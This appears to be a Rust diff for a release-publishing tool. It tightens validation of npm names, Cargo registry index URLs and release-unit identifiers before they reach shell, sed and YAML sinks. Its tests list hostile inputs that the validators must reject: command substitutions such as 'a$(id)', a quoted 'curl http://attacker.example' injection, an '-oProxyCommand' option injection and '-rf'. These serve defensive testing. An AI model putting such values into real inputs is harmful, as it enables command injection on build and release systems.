@@ -49,12 +49,13 @@ pub struct SuppliedName<'a> {
 
 /// Characters an npm package name may carry beyond letters and digits.
 ///
-/// npm's own rule is wider than this in its history and narrower in its
-/// present: the registry has accepted uppercase and other punctuation in names
-/// created long ago, and rejects them for new ones. The maintained recipe reads
-/// what a repository publishes today, so the modern set is what it admits, and
-/// a legacy name is refused with a diagnostic rather than carried into a
-/// credentialed script.
+/// npm rejects uppercase in names created today and still serves names created
+/// before it did, and a repository publishing such a name is publishing a real
+/// package. The rule is therefore about what is safe at the sinks rather than
+/// about what npm would accept from a new author: letters in either case are
+/// inert in shell source, in a `sed` address, in a YAML scalar and in an
+/// argument vector, so a legacy name is admitted and refusing it would break a
+/// publication for a reason this module has no standing to raise.
 const NPM_EXTRA: [char; 4] = ['-', '.', '_', '~'];
 
 /// Characters a Cargo crate name may carry beyond letters and digits.
@@ -117,17 +118,60 @@ pub fn registry(supplied: &SuppliedName<'_>) -> Result<String, String> {
     )
 }
 
+/// Reject a Cargo registry index a maintained recipe would resolve through.
+///
+/// The index is read out of the workspace's `.cargo/config.toml` at derivation
+/// and passed to the probe as the environment variable cargo reads for it, so
+/// the probe inherits no configuration and this one value is the whole of what
+/// crosses. It is not an identifier, so it is held to the shape of the thing it
+/// is: a fetchable index URL, spelled the way cargo spells one, over a
+/// character set that carries no shell metacharacter, no quote and no
+/// whitespace.
+pub fn registry_index(supplied: &SuppliedName<'_>) -> Result<String, String> {
+    let value = supplied.value;
+    let addressed = value
+        .strip_prefix("sparse+https://")
+        .or_else(|| value.strip_prefix("https://"))
+        .or_else(|| value.strip_prefix("ssh://"));
+    let accepted = addressed.is_some_and(|rest| {
+        !rest.is_empty()
+            && rest.chars().all(|character| {
+                character.is_ascii_alphanumeric() || "-._~:/?#[]@!$&'()*+,;=%".contains(character)
+            })
+    });
+    if accepted {
+        Ok(value.to_owned())
+    } else {
+        Err(refusal(
+            supplied,
+            "a Cargo registry index",
+            "an https, sparse+https or ssh URL over unreserved and reserved URL characters",
+        ))
+    }
+}
+
 /// Reject a release-unit identifier a maintained recipe would write into evidence.
 ///
 /// The identifier is a configuration mapping key, so it is repository content
 /// like any manifest value. It reaches an Action input, a YAML scalar in the
 /// observation, and the publication identity verification resolves.
+///
+/// This is deliberately narrower than [`crate::config`]'s own identifier rule,
+/// which admits `@` and `/` so a workspace can key a release unit the way a
+/// scoped package is named. That is the right rule for a workspace: an id is a
+/// map key there, and a release unit that publishes nothing never reaches any
+/// of the sinks above. It is the wrong rule for a publishing one — a `/` in a
+/// `sed` address terminates the address, and the subject-identity stand-in
+/// reaches exactly that — so publication holds the same value to less. The two
+/// are pinned against each other by a test, because a widening of either is
+/// otherwise invisible to the other, and the difference is a refusal an author
+/// can act on rather than a shape that fails on a release runner.
 pub fn release_unit(supplied: &SuppliedName<'_>) -> Result<String, String> {
     accept(
         supplied,
         &RELEASE_UNIT_EXTRA,
-        "a release-unit identifier",
-        "letters, digits, hyphens, dots and underscores, starting with a letter or digit",
+        "a release-unit identifier that publishes",
+        "letters, digits, hyphens, dots and underscores, starting with a letter or digit; a release unit that publishes is named in its recipe's scripts and evidence, so rename it or remove its publisher configuration",
     )
 }
 
@@ -217,6 +261,13 @@ mod tests {
             "a$(id)",
             "a`id`",
             "a'b",
+            // A scoped name has two segments and both are held to the rule.
+            // Every hostile value above is unscoped, so a weaker scope check --
+            // non-empty rather than well-formed -- would pass all of them; the
+            // scope half needs a case where the package half is impeccable.
+            "@a$(id)/example-component",
+            "@a\"; curl http://attacker.example/x/example-component",
+            "@-oProxyCommand/example-component",
             // A name is passed as its own argument vector element in several
             // places, and a leading hyphen there is an option rather than a
             // name. These carry no character the charsets refuse, so the
@@ -254,6 +305,56 @@ mod tests {
             assert!(
                 secret(Some(&supplied), "CONVENTIONAL").is_err(),
                 "a secret name admits {hostile:?}"
+            );
+        }
+    }
+
+    // The workspace admits identifiers publication does not, and that gap is a
+    // decision rather than an accident: a workspace keys a release unit however
+    // it likes, and only a publishing one is named in a `sed` address, an
+    // argument vector and a YAML scalar. The gap is pinned here because a
+    // widening of either rule is invisible to the other -- and because the
+    // shapes in the middle are the ones an author is most likely to type, so
+    // what they get has to be a refusal that names the fix rather than a
+    // workflow that fails where nobody can read it.
+    #[test]
+    fn stays_narrower_than_the_workspace_rule_it_is_pinned_against() {
+        // Admitted by both: an ordinary release-unit identifier.
+        for shared in ["component", "example-component", "example.component"] {
+            assert!(
+                crate::config::validate_release_unit_id(shared).is_ok(),
+                "the workspace admits {shared}"
+            );
+            assert!(
+                release_unit(&supplied(shared)).is_ok(),
+                "publication admits {shared}"
+            );
+        }
+        // Admitted by the workspace, refused by publication. Each of these
+        // derives a diagnostic naming the release unit rather than a workflow.
+        for narrowed in [
+            "example-owner/component",
+            "@example-owner/component",
+            "@component",
+            "-rf",
+            ".hidden",
+        ] {
+            assert!(
+                crate::config::validate_release_unit_id(narrowed).is_ok(),
+                "the workspace admits {narrowed}"
+            );
+            let refusal = release_unit(&supplied(narrowed))
+                .expect_err("publication refuses what its sinks cannot carry");
+            assert!(
+                refusal.contains("rename it or remove its publisher configuration"),
+                "the refusal names what an author can do: {refusal}"
+            );
+        }
+        // Refused by both, so the workspace is the first to speak.
+        for refused in ["a b", "a\"b", "a$(id)"] {
+            assert!(
+                crate::config::validate_release_unit_id(refused).is_err(),
+                "the workspace refuses {refused}"
             );
         }
     }
